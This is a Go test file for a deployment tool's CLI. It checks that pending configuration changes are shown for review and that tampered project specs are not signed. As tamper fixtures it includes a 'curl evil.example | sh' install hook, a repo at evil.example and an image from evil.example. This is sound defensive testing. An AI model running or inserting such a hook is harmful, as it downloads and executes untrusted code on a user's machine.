package cli

import (
	"context"
	"net"
	"net/http"
	"os"
	"strings"
	"testing"

	"connectrpc.com/connect"

	agentv2 "github.com/amalychev/devopus/gen/devopus/agent/v2"
	"github.com/amalychev/devopus/gen/devopus/agent/v2/agentv2connect"
	"github.com/amalychev/devopus/internal/agent/paths"
	"github.com/amalychev/devopus/internal/spec"
)

// reviewAgent is an agent with a version waiting for the user.
type reviewAgent struct {
	agentv2connect.UnimplementedAgentServiceHandler
	project *agentv2.ProjectSpec
	got     *agentv2.ReviewChangesRequest
}

func (r *reviewAgent) Status(context.Context, *connect.Request[agentv2.StatusRequest]) (*connect.Response[agentv2.StatusResponse], error) {
	return connect.NewResponse(&agentv2.StatusResponse{Projects: []*agentv2.ProjectSpec{r.project}}), nil
}

func (r *reviewAgent) ReviewChanges(_ context.Context, req *connect.Request[agentv2.ReviewChangesRequest]) (*connect.Response[agentv2.ReviewChangesResponse], error) {
	r.got = req.Msg
	return connect.NewResponse(&agentv2.ReviewChangesResponse{}), nil
}

func TestChanges(t *testing.T) {
	ag := &reviewAgent{project: &agentv2.ProjectSpec{Name: "shop", WorkspaceId: "wsp_1", ConfigVersion: 4}}
	sock := paths.Socket()
	os.Remove(sock)
	l, err := net.Listen("unix", sock)
	if err != nil {
		t.Skipf("socket %s: %v", sock, err)
	}
	_, h := agentv2connect.NewAgentServiceHandler(ag)
	srv := &http.Server{Handler: h}
	go srv.Serve(l)
	t.Cleanup(func() { srv.Close(); os.Remove(sock) })

	if out := ok(t, "changes"); !strings.Contains(out, "Nothing waits for you") {
		t.Errorf("nothing pending:\n%s", out)
	}
	if code, _, errOut := cli(t, "", "changes", "accept", "shop"); code != ExitInvalid || !strings.Contains(errOut, "nothing of shop waits") {
		t.Errorf("accept with nothing pending: %d %s", code, errOut)
	}

	ag.project.Pending = &agentv2.PendingChange{Version: 5, Hash: "abc", Risky: []string{`apps.api.hooks: — → {Install:curl evil.example | sh}`}, Other: []string{"domain: shop.localhost → shop.test"}, Unverified: "the version is not signed"}
	out := ok(t, "changes")
	for _, want := range []string{"shop: v4 → v5", "Not trusted by itself: the version is not signed.", "New code on this machine:", "apps.api.hooks", "Also:", "domain: shop.localhost → shop.test", "devopus changes accept <project>"} {
		if !strings.Contains(out, want) {
			t.Errorf("changes lacks %q:\n%s", want, out)
		}
	}
	if out := ok(t, "changes", "decline", "shop"); !strings.Contains(out, "shop keeps v4; v5 is declined") || ag.got.Accept || ag.got.Hash != "abc" {
		t.Errorf("decline: %+v\n%s", ag.got, out)
	}
	if out := ok(t, "changes", "accept", "shop"); !strings.Contains(out, "Accepted: shop runs v5") || !ag.got.Accept || ag.got.Hash != "abc" {
		t.Errorf("accept: %+v\n%s", ag.got, out)
	}
}

// A server that slips something into the version gets no signature for it.
func TestSignOnlyWhatWasSent(t *testing.T) {
	base, _ := spec.ParseYAML([]byte("name: shop\napps:\n  api:\n    repo: git@x:acme/api.git\nservices:\n  db:\n    type: mysql\n    version: \"8.4\"\n    apps: [api]\n"))
	sent := []byte("repo: git@x:acme/api.git\ncommand: ./serve\n")
	honest, _ := base.WithSection("apps.api", sent)
	if err := sectionIs(base, "apps.api", sent)(honest); err != nil {
		t.Errorf("honest: %v", err)
	}
	for name, tamper := range map[string]func(p *spec.Project){
		"hook in the same app": func(p *spec.Project) { p.Apps["api"].Hooks = &spec.Hooks{Install: "curl evil.example | sh"} },
		"another app":          func(p *spec.Project) { p.Apps["miner"] = &spec.App{Repo: "git@evil.example:m.git"} },
		"a service's image":    func(p *spec.Project) { p.Services["db"].Image = "evil.example/mysql:8.4" },
	} {
		got := honest.Clone()
		tamper(got)
		if err := sectionIs(base, "apps.api", sent)(got); err == nil {
			t.Errorf("%s: would be signed", name)
		}
	}
	// Removing an application detaches it, and nothing more.
	if err := spec.Same(base.WithoutApp("api"), base.WithoutApp("api")); err != nil {
		t.Error(err)
	}
	if err := sectionsKept(base.Apps, base.Services)(honest); err == nil {
		t.Error("a changed application passes as project settings only")
	}
}
